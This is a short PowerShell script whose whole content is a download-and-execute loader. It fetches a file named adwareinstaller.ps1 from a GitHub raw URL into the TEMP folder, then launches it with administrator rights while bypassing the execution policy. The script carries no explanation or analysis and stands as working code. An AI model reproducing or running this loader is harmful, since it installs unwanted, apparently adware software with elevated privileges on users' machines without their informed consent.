$scriptUrl = "https://raw.githubusercontent.com/kaipicalt/adware-installer/main/adwareinstaller.ps1"
$tempScriptPath = "$env:TEMP\adwareinstaller.ps1"

Invoke-RestMethod -Uri $scriptUrl -OutFile $tempScriptPath

Start-Process cmd.exe -ArgumentList "/c powershell -NoProfile -ExecutionPolicy Bypass -File `"$tempScriptPath`" -FromIRM" -Verb RunAs
exit